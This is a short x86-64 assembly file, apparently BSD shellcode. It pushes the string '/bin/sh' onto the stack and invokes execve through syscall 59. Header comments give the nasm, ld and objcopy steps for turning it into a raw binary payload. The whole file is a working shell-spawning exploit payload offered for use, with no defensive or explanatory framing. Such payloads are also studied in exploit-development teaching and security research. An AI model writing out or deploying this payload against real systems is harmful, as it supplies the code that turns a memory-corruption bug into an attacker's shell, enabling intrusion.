; BSD x86-64 execve("/bin/sh", NULL, NULL)
; Syscall 59 — same number on FreeBSD/HardenedBSD
;
; Assemble:  nasm -f elf64 shellcode.asm -o shellcode.o
; Link:      ld -o shellcode shellcode.o
; Extract:   objcopy -O binary shellcode.o shellcode.bin

section .text
global _start

_start:
    xor    rdx, rdx          ; envp = NULL
    xor    rsi, rsi          ; argv = NULL

    ; push "/bin/sh\0" onto the stack
    push   rdx               ; null terminator
    mov    rax, 0x68732f6e69622f  ; "/bin/sh" (little-endian)
    push   rax
    mov    rdi, rsp           ; rdi = pointer to "/bin/sh"

    ; execve(rdi, rsi, rdx)
    xor    rax, rax
    mov    al, 59             ; SYS_execve
    syscall
